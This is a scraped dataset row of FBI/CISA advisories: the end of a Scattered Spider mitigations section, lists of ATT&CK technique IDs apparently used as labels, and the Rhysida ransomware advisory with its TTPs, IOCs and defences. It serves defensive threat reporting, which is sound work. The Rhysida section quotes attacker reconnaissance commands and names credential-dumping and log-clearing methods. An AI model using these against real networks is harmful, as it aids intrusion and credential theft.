These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on the threat actor activity and to reduce the risk of compromise by Scattered Spider threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable,CPG 2.T,.
Using security software to detect instances of remote access software being loaded only in memory.
Requiring authorized remote access solutions to be used only from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.
Applying recommendations in the Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public Key Infrastructure (PKI)-based MFA. These MFA implementations are resistant to phishing and not suspectable to push bombing or SIM swap attacks, which are techniques known to be used by Scattered Spider actors. See CISA’s fact sheet Implementing Phishing-Resistant MFA for more information.
Strictly limit the use of Remote Desktop Protocol (RDP) and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.



In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices,CPG 2.R,.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Implement password policies in compliance with NIST’s standards.
Use “strong” passwords that are unique and random, as well as contain at least sixteen characters and no more than 64 characters in length,CPG 2.B,.
Consider implementing industry-recognized password managers that align with organizational technology procurement policies.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring recurring password changes.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems,CPG 2.H,.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI and CISA are seeking any information that can be shared, to include a sample ransom note, communications with Scattered Spider group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, report the incident to the FBI Internet Crime Complaint Center (IC3) at IC3.gov, or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
REFERENCES,1, MITRE ATT&CK – Scattered Spider,2, Trellix - Scattered Spider: The Modus Operandi,3, Crowdstrike - Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies,4, Crowdstrike - SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security,5, Malwarebytes - Ransomware group steps up, issues statement over MGM Resorts compromise
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI and CISA.
VERSION HISTORY
November 16, 2023: Initial version.November 21, 2023: Updated password recommendation language on page 12.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1119', 'T1553', 'T1568', 'T1482', 'T1548', 'T1531', 'T1587', 'T1480', 'T1588', 'T1550', 'T1087', 'T1199', 'T1029', 'T1098', 'T1205', 'T1594', 'T1020', 'T1528', 'T1078', 'T1486', 'T1562', 'T1213']","{'T1070', 'T1548.004', 'T1588.002', 'T1005', 'T1057', 'T1021.001', 'T1587.001', 'T1018', 'T1591.004', 'T1111', 'T1555.005', 'T1556.002', 'T1213.003', 'T1556.007', 'T1589.001', 'T1110.001', 'T1102', 'T1204', 'T1213.002', 'T1585.002', 'T1098.003', 'T1218', 'T1490', 'T1599', 'T1562.001', 'T1585.001', 'T1219', 'T1589.002', 'T1213.001', 'T1027', 'T1562.002', 'T1070.001', 'T1566', 'T1538', 'T1133', 'T1657', 'T1484.002', 'T1597.001', 'T1656', 'T1562.007', 'T1591', 'T1190', 'T1486', 'T1078', 'T1074.002', 'T1621', 'T1553.006', 'T1518.001'}","{'T1070', 'T1583.001', 'T1588.002', 'T1005', 'T1218.001', 'T1057', 'T1021.001', 'T1587.001', 'T1018', 'T1591.004', 'T1592', 'T1111', 'T1555.005', 'T1556.002', 'T1556.007', 'T1566.001', 'T1589.001', 'T1082', 'T1646', 'T1102', 'T1110.001', 'T1204', 'T1213.002', 'T1585.002', 'T1098.003', 'T1490', 'T1599', 'T1562.001', 'T1585.001', 'T1219', 'T1589.002', 'T1598', 'T1223', 'T1566, T1078', 'T1556.', 'T1621, T1078.003', 'T1027', 'T1213.003, T1552.004', 'T1562.002', 'T1070.001', 'T1489', 'T1480.001', 'T1133', 'T1657', 'T1484.002', 'T1597.001', 'T1656', 'T1538, T1021.007', 'T1562.007', 'T1202', 'T1190', 'T1486', 'T1078', 'T1074.002', 'T1201', 'T1566.002', 'T1114.002, T1213', 'T1518.001', 'T1003'}","{'T1589', 'T1078, T1136, T1548', 'T1078, T1556', 'T1078, T1589', 'T1055', 'T1083, T1213, T1003, T1078, T1021, T1041', 'T1212', 'T1589, T1078', 'T1040, T1071, T1021', 'T1219, T1078', 'T1563', 'T1210, T1562.001, T1588.006', 'T1018, T1083, T1020', 'T1539, T1586, T1566, T1078', 'T1078, T1082, T1570', 'T1078, T1068', 'T1553', 'T1566, T1589, T1078, T1203', 'T1049, T1070, T1486', 'T1569', 'T1204', 'T1598, T1589, T1566', 'T1559', 'T1589, T1598', 'T1588', 'T1114, T1071, T1105', 'T1218, T1078, T1027', 'T1219', 'T1203', 'T1076', 'T1027', 'T1078, T1133', 'T1566', 'T1567', 'T1110', 'T1486, T1489', 'T1586, T1566', 'T1071', 'T1070, T1027', 'T1556', 'T1486, T1567, T1027', 'T1020', 'T1564', 'T1486', 'T1078', 'T1566, T1621', 'T1560', 'T1201', 'T1562', 'T1021', 'T1585', 'T1486, T1078, T1027'}"
14,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a,"






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Segment networks to prevent the spread of ransomware.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders detailing various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known Rhysida ransomware IOCs and TTPs identified through investigations as recently as September 2023. Rhysida—an emerging ransomware variant—has predominately been deployed against the education, healthcare, manufacturing, information technology, and government sectors since May 2023. The information in this CSA is derived from related incident response investigations and malware analysis of samples discovered on victim networks.
FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Rhysida ransomware and other ransomware incidents.
Download the PDF version of this report:


AA23-319A #StopRansomware: Rhysida Ransomware
(PDF,       674.56 KB
  )


For a downloadable copy of IOCs, see:


AA23-319A STIX XML
(XML,       115.31 KB
  )




AA23-319A STIX JSON
(JSON,       65.69 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Threat actors leveraging Rhysida ransomware are known to impact “targets of opportunity,” including victims in the education, healthcare, manufacturing, information technology, and government sectors. Open source reporting details similarities between Vice Society (DEV-0832)[1] activity and the actors observed deploying Rhysida ransomware. Additionally, open source reporting[2] has confirmed observed instances of Rhysida actors operating in a ransomware-as-a-service (RaaS) capacity, where ransomware tools and infrastructure are leased out in a profit-sharing model. Any ransoms paid are then split between the group and the affiliates.
For additional information on Vice Society actors and associated activity, see the joint CSA #StopRansomware: Vice Society.
Initial Access
Rhysida actors have been observed leveraging external-facing remote services to initially access and persist within a network. Remote services, such as virtual private networks (VPNs), allow users to connect to internal enterprise network resources from external locations. Rhysida actors have commonly been observed authenticating to internal VPN access points with compromised valid credentials [T1078], notably due to organizations lacking MFA enabled by default. Additionally, actors have been observed exploiting Zerologon (CVE-2020-1472)—a critical elevation of privileges vulnerability in Microsoft’s Netlogon Remote Protocol [T1190]—as well as conducting successful phishing attempts [T1566]. Note: Microsoft released a patch for CVE-2020-1472 on August 11, 2020.[3]
Living off the Land
Analysis identified Rhysida actors using living off the land techniques, such as creating Remote Desktop Protocol (RDP) connections for lateral movement [T1021.001], establishing VPN access, and utilizing PowerShell [T1059.001]. Living off the land techniques include using native (built into the operating system) network administration tools to perform operations. This allows the actors to evade detection by blending in with normal Windows systems and network activities.
Ipconfig [T1016], whoami [T1033], nltest [T1482], and several net commands have been used to enumerate victim environments and gather information about domains. In one instance of using compromised credentials, actors leveraged net commands within PowerShell to identify logged-in users and performed reconnaissance on network accounts within the victim environment. Note: The following commands were not performed in the exact order listed.

net user [username] /domain [T1087.002]
net group “domain computers” /domain [T1018]
net group “domain admins” /domain [T1069.002]
net localgroup administrators [T1069.001]

Analysis of the master file table (MFT)[4] identified the victim system generated the ntuser.dat registry hive, which was created when the compromised user logged in to the system for the first time. This was considered anomalous due to the baseline of normal activity for that particular user and system. Note: The MFT resides within the New Technology File System (NTFS) and houses information about a file including its size, time and date stamps, permissions, and data content.
Leveraged Tools
Table 1 lists legitimate tools Rhysida actors have repurposed for their operations. The legitimate tools listed in this joint CSA are all publicly available. Use of these tools should not be attributed as malicious without analytical evidence to support they are used at the direction of or controlled by threat actors.
Disclaimer: Organizations are encouraged to investigate and vet use of these tools prior to performing remediation actions.

Table 1: Tools Leveraged by Rhysida Actors


Name
Description




cmd.exe
The native command line prompt utility.


PowerShell.exe
A native command line tool used to start a Windows PowerShell session in a Command Prompt window.


PsExec.exe
A tool included in the PsTools suite used to execute processes remotely. Rhysida actors heavily leveraged this tool for lateral movement and remote execution.


mstsc.exe
A native tool that establishes an RDP connection to a host.


PuTTY.exe
Rhysida actors have been observed creating Secure Shell (SSH) PuTTy connections for lateral movement. In one example, analysis of PowerShell console host history for a compromised user account revealed Rhysida actors leveraged PuTTy to remotely connect to systems via SSH [T1021.004].


PortStarter
A back door script written in Go that provides functionality for modifying firewall settings and opening ports to pre-configured command and control (C2) servers.[1]


secretsdump
A script used to extract credentials and other confidential information from a system. Rhysida actors have been observed using this for NTDS dumping [T1003.003] in various instances.


ntdsutil.exe

A standard Windows tool used to interact with the NTDS database. Rhysida actors used this tool to extract and dump the NTDS.dit database from the domain controller containing hashes for all Active Directory (AD) users.
Note: It is strongly recommended that organizations conduct domain-wide password resets and double Kerberos TGT password resets if any indication is found that the NTDS.dit file was compromised.



AnyDesk
A common software that can be maliciously used by threat actors to obtain remote access and maintain persistence [T1219]. AnyDesk also supports remote file transfer.


wevtutil.exe
A standard Windows Event Utility tool used to view event logs. Rhysida actors used this tool to clear a significant number of Windows event logs, including system, application, and security logs [T1070.001].


PowerView
A PowerShell tool used to gain situational awareness of Windows domains. Review of PowerShell event logs identified Rhysida actors using this tool to conduct additional reconnaissance-based commands and harvest credentials.



Rhysida Ransomware Characteristics
Execution
In one investigation, Rhysida actors created two folders in the C:\ drive labeled in and out, which served as a staging directory (central location) for hosting malicious executables. The in folder contained file names in accordance with host names on the victim’s network, likely imported through a scanning tool. The out folder contained various files listed in Table 2 below. Rhysida actors deployed these tools and scripts to assist system and network-wide encryption.

Table 2: Malicious Executables Affiliated with Rhysida Infections


File Name
Hash (SHA256)
Description




conhost.exe
6633fa85bb234a75927b23417313e51a4c155e12f71da3959e168851a600b010
A ransomware binary.


psexec.exe
078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b
A file used to execute a process on a remote or local host.


S_0.bat
1c4978cd5d750a2985da9b58db137fc74d28422f1e087fd77642faa7efe7b597
A batch script likely used to place 1.ps1 on victim systems for ransomware staging purposes [T1059.003].


1.ps1
4e34b9442f825a16d7f6557193426ae7a18899ed46d3b896f6e4357367276183
Identifies an extension block list of files to encrypt and not encrypt.


S_1.bat
97766464d0f2f91b82b557ac656ab82e15cae7896b1d8c98632ca53c15cf06c4
A batch script that copies conhost.exe (the encryption binary) on an imported list of host names within the C:\Windows\Temp directory of each system.


S_2.bat
918784e25bd24192ce4e999538be96898558660659e3c624a5f27857784cd7e1
Executes conhost.exe on compromised victim systems, which encrypts and appends the extension of .Rhysida across the environment.



Rhysida ransomware uses a Windows 64-bit Portable Executable (PE) or common object file format (COFF) compiled using MinGW via the GNU Compiler Collection (GCC), which supports various programming languages such as C, C++, and Go. The cryptographic ransomware application first injects the PE into running processes on the compromised system [T1055.002]. Additionally, third-party researchers identified evidence of Rhysida actors developing custom tools with program names set to “Rhysida-0.1” [T1587].
Encryption
After mapping the network, the ransomware encrypts data using a 4096-bit RSA encryption key with a ChaCha20 algorithm [T1486]. The algorithm features a 256-bit key, a 32-bit counter, and a 96-bit nonce along with a four-by-four matrix of 32-bit words in plain text. Registry modification commands [T1112] are not obfuscated, displayed as plain-text strings and executed via cmd.exe.
Rhysida’s encryptor runs a file to encrypt and modify all encrypted files to display a .rhysida extension.[5] Following encryption, a PowerShell command deletes the binary [T1070.004] from the network using a hidden command window [T1564.003]. The Rhysida encryptor allows arguments -d (select a directory) and -sr (file deletion), defined by the authors of the code as parseOptions.[6] After the lines of binary strings complete their tasks, they delete themselves through the control panel to evade detection.
Data Extortion
Rhysida actors reportedly engage in “double extortion” [T1657]—demanding a ransom payment to decrypt victim data and threatening to publish the sensitive exfiltrated data unless the ransom is paid.[5],[7] Rhysida actors direct victims to send ransom payments in Bitcoin to cryptocurrency wallet addresses provided by the threat actors. As shown in Figure 1, Rhysida ransomware drops a ransom note named “CriticalBreachDetected” as a PDF file—the note provides each company with a unique code and instructions to contact the group via a Tor-based portal.

 

Figure 1: Rhysida Ransom Note

Identified in analysis and also listed in open source reporting, the contents of the ransom note are embedded as plain-text in the ransom binary, offering network defenders an opportunity to deploy string-based detection for alerting on evidence of the ransom note. Rhysida threat actors may target systems that do not use command-line operating systems. The format of the PDF ransom notes could indicate that Rhysida actors only target systems that are compatible with handling PDF documents.[8]
INDICATORS OF COMPROMISE
On November 10, 2023, Sophos published TTPs and IOCs identified from analysis conducted for six separate incidents.[9] The C2 IP addresses listed in Table 3 were derived directly from Sophos’ investigations and are listed on GitHub among other indicators.[10]

Table 3: C2 IP Addresses Used for Rhysida Operations


C2 IP Address




5.39.222[.]67


5.255.99[.]59


51.77.102[.]106


108.62.118[.]136


108.62.141[.]161


146.70.104[.]249


156.96.62[.]58


157.154.194[.]6



Additional IOCs were obtained from FBI, CISA, and the MS-ISAC’s investigations and analysis. The email addresses listed in Table 4 are associated with Rhysida actors’ operations. Rhysida actors have been observed creating Onion Mail email accounts for services or victim communication, commonly in the format: [First Name][Last Name]@onionmail[.]org.

Table 4: Email Addresses Used to Support Rhysida Operations


Email Address




rhysidaeverywhere@onionmail[.]org


rhysidaofficial@onionmail[.]org



Rhysida actors have also been observed using the following files and executables listed in Table 5 to support their operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions.

Table 5: Files Used to Support Rhysida Operations


File Name
Hash (SHA256)




Sock5.sh
48f559e00c472d9ffe3965ab92c6d298f8fb3a3f0d6d203cd2069bfca4bf3a57


PsExec64.exe
edfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef


PsExec.exe
078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b


PsGetsid64.exe
201d8e77ccc2575d910d47042a986480b1da28cf0033e7ee726ad9d45ccf4daa


PsGetsid.exe
a48ac157609888471bf8578fb8b2aef6b0068f7e0742fccf2e0e288b0b2cfdfb


PsInfo64.exe
de73b73eeb156f877de61f4a6975d06759292ed69f31aaf06c9811f3311e03e7


PsInfo.exe
951b1b5fd5cb13cde159cebc7c60465587e2061363d1d8847ab78b6c4fba7501


PsLoggedon64.exe
fdadb6e15c52c41a31e3c22659dd490d5b616e017d1b1aa6070008ce09ed27ea


PsLoggedon.exe
d689cb1dbd2e4c06cd15e51a6871c406c595790ddcdcd7dc8d0401c7183720ef


PsService64.exe
554f523914cdbaed8b17527170502199c185bd69a41c81102c50dbb0e5e5a78d


PsService.exe
d3a816fe5d545a80e4639b34b90d92d1039eb71ef59e6e81b3c0e043a45b751c


Eula.txt
8329bcbadc7f81539a4969ca13f0be5b8eb7652b912324a1926fc9bfb6ec005a


psfile64.exe
be922312978a53c92a49fefd2c9f9cc098767b36f0e4d2e829d24725df65bc21


psfile.exe
4243dc8b991f5f8b3c0f233ca2110a1e03a1d716c3f51e88faf1d59b8242d329


pskill64.exe
7ba47558c99e18c2c6449be804b5e765c48d3a70ceaa04c1e0fae67ff1d7178d


pskill.exe
5ef168f83b55d2cbd2426afc5e6fa8161270fa6a2a312831332dc472c95dfa42


pslist64.exe
d3247f03dcd7b9335344ebba76a0b92370f32f1cb0e480c734da52db2bd8df60


pslist.exe
ed05f5d462767b3986583188000143f0eb24f7d89605523a28950e72e6b9039a


psloglist64.exe
5e55b4caf47a248a10abd009617684e969dbe5c448d087ee8178262aaab68636


psloglist.exe
dcdb9bd39b6014434190a9949dedf633726fdb470e95cc47cdaa47c1964b969f


pspasswd64.exe
8d950068f46a04e77ad6637c680cccf5d703a1828fbd6bdca513268af4f2170f


pspasswd.exe
6ed5d50cf9d07db73eaa92c5405f6b1bf670028c602c605dfa7d4fcb80ef0801


psping64.exe
d1f718d219930e57794bdadf9dda61406294b0759038cef282f7544b44b92285


psping.exe
355b4a82313074999bd8fa1332b1ed00034e63bd2a0d0367e2622f35d75cf140


psshutdown64.exe
4226738489c2a67852d51dbf96574f33e44e509bc265b950d495da79bb457400


psshutdown.exe
13fd3ad690c73cf0ad26c6716d4e9d1581b47c22fb7518b1d3bf9cfb8f9e9123


pssuspend64.exe
4bf8fbb7db583e1aacbf36c5f740d012c8321f221066cc68107031bd8b6bc1ee


pssuspend.exe
95a922e178075fb771066db4ab1bd70c7016f794709d514ab1c7f11500f016cd


PSTools.zip
a9ca77dfe03ce15004157727bb43ba66f00ceb215362c9b3d199f000edaa8d61


Pstools.chm
2813b6c07d17d25670163e0f66453b42d2f157bf2e42007806ebc6bb9d114acc


psversion.txt
8e43d1ddbd5c129055528a93f1e3fab0ecdf73a8a7ba9713dc4c3e216d7e5db4


psexesvc.exe
This artifact is created when a user establishes a connection using psexec. It is removed after the connection is terminated, which is why there is no hash available for this executable.



MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 6-15 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Additional notable TTPs have been published by the Check Point Incident Response Team.[11]

Table 6: Resource Development


Technique Title
ID
Use




Develop Capabilities
T1587
Rhysida actors have been observed developing resources and custom tools, particularly with program names set to “Rhysida-0.1” to gain access to victim systems.




Table 7: Initial Access


Technique Title
ID
Use




Valid Accounts
T1078
Rhysida actors are known to use valid credentials to access internal VPN access points of victims.


Exploit Public-Facing Application
T1190
Rhysida actors have been identified exploiting Zerologon, a critical elevation of privilege vulnerability within Microsoft’s Netlogon Remote Protocol.


Phishing
T1566
Rhysida actors are known to conduct successful phishing attacks.




Table 8: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: PowerShell
T1059.001
Rhysida actors used PowerShell commands (ipconfig, nltest, net) and various scripts to execute malicious actions.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
Rhysida actors used batch scripting to place 1.ps1 on victim systems to automate ransomware execution.




Table 9: Privilege Escalation


Technique Title
ID
Use




Process Injection: Portable Executable Injection
T1055.002
Rhysida actors injected a Windows 64-bit PE cryptographic ransomware application into running processes on compromised systems.




Table 10: Defense Evasion


Technique Title
ID
Use




Indicator Removal: Clear Windows Event Logs
T1070.001
Rhysida actors used wevtutil.exe to clear Windows event logs, including system, application, and security logs.


Indicator Removal: File Deletion
T1070.004
Rhysida actors used PowerShell commands to delete binary strings.


Hide Artifacts: Hidden Window
T1564.003
Rhysida actors have executed hidden PowerShell windows.




Table 11: Credential Access


Technique Title
ID
Use




OS Credential Dumping: NTDS
T1003.003
Rhysida actors have been observed using secretsdump to extract credentials and other confidential information from a system, then dumping NTDS credentials.


Modify Registry
T1112
Rhysida actors were observed running registry modification commands via cmd.exe.




Table 12: Discovery


Technique Title
ID
Use




System Network Configuration Discovery
T1016
Rhysida actors used the ipconfig command to enumerate victim system network settings.


Remote System Discovery
T1018
Rhysida actors used the command net group “domain computers” /domain to enumerate servers on a victim domain.


System Owner/User Discovery
T1033
Rhysida actors leveraged whoami and various net commands within PowerShell to identify logged-in users.


Permission Groups Discovery: Local Groups
T1069.001
Rhysida actors used the command net localgroup administrators to identify accounts with local administrator rights.


Permission Groups Discovery: Domain Groups
T1069.002
Rhysida actors used the command net group “domain admins” /domain to identify domain administrators.


Account Discovery: Domain Account
T1087.002
Rhysida actors used the command net user [username] /domain to identify account information.


Domain Trust Discovery
T1482
Rhysida actors used the Windows utility nltest to enumerate domain trusts.




Table 13: Lateral Movement


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
Rhysida actors are known to use RDP for lateral movement.


Remote Services: SSH
T1021.004
Rhysida actors used compromised user credentials to leverage PuTTy and remotely connect to victim systems via SSH.




Table 14: Command and Control


Technique Title
ID
Use




Remote Access Software
T1219
Rhysida actors have been observed using the AnyDesk software to obtain remote access to victim systems and maintain persistence.




Table 15: Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
Rhysida actors encrypted victim data using a 4096-bit RSA encryption key that implements a ChaCha20 algorithm.


Financial Theft
T1657
Rhysida actors reportedly engage in “double extortion”— demanding a ransom payment to decrypt victim data and threatening to publish the sensitive exfiltrated data unless the ransom is paid.



MITIGATIONS
FBI, CISA, and the MS-ISAC recommend that organizations implement the mitigations below to improve your organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and the MS-ISAC recommend incorporating secure-by-design and -default principles, limiting the impact of ransomware techniques and strengthening overall security posture. For more information on secure by design, see CISA’s Secure by Design webpage.

Require phishing-resistant MFA for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems [CPG 2.H].
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [CPG 2.N].
Implement verbose and enhanced logging within processes such as command line auditing[12] and process tracking[13].
Restrict the use of PowerShell using Group Policy and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical operating system and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances (using the latest version) have module, script block, and transcription logging enabled (e.g., enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows event log and the PowerShell operational log. FBI, CISA, and the MS-ISAC recommend turning on these two Windows event logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Restrict the use of RDP and other remote desktop services to known user accounts and groups. If RDP is necessary, apply best practices such as [CPG 2.W]:

Implement MFA for privileged accounts using RDP.
Use Remote Credential Guard[14] to protect credentials, particularly domain administrator or other high value accounts.
Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Log RDP login attempts.


Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important as antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Apply the recommendations in CISA's joint Guide to Securing Remote Access Software.



In addition, FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP) [CPG 2.E].
Implement time-based access for accounts set at the admin level and higher [CPG 2.A, 2.E]. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support the enforcement of PoLP (as well as the zero trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backups and their restoration (daily or weekly at minimum). By instituting this practice, organizations limit the severity of disruption to business operations [CPG 2.R].
